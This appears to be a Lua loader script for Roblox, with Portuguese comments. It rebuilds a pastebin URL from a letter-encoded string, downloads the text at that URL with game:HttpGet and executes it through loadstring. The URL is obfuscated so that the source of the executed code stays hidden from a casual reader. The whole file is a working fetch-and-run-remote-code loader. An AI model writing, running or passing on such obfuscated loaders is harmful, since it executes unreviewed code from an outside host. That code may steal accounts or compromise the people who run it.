-- Loader que reconstrói a URL (string só com letras) e executa o RAW
local encoded_letters = "gihehehahddkcpcphagbhdhegfgcgjgocogdgpgncphcgbhhcphgggfcgledfbgjdh"

-- mapa: a->0, b->1, ..., j->9, k->a, l->b, ..., p->f
local function letters_to_hex(s)
    local out = {}
    for i = 1, #s do
        local ch = s:sub(i,i)
        local v = ch:byte() - 97  -- 'a' == 97
        if v < 0 or v > 15 then
            error("Caracter inválido na string codificada: " .. tostring(ch))
        end
        out[#out+1] = string.format("%x", v) -- 0..15 -> '0'..'f'
    end
    return table.concat(out)
end

local function hex_to_string(hex)
    local bytes = {}
    for i = 1, #hex, 2 do
        local byte = tonumber(hex:sub(i, i+1), 16)
        bytes[#bytes+1] = string.char(byte)
    end
    return table.concat(bytes)
end

-- decodifica
local hex = letters_to_hex(encoded_letters)
local url = hex_to_string(hex)

-- opcional: mostrar a url (descomente para checar antes de executar)
-- print("URL reconstruída:", url)

-- agora executa o loadstring do raw baixado
local ok, raw = pcall(function() return game:HttpGet(url) end)
if not ok then
    warn("Falha ao baixar URL:", raw)
    return
end

local fn, err = loadstring(raw)
if not fn then
    warn("Erro no loadstring:", err)
    return
end
pcall(fn)
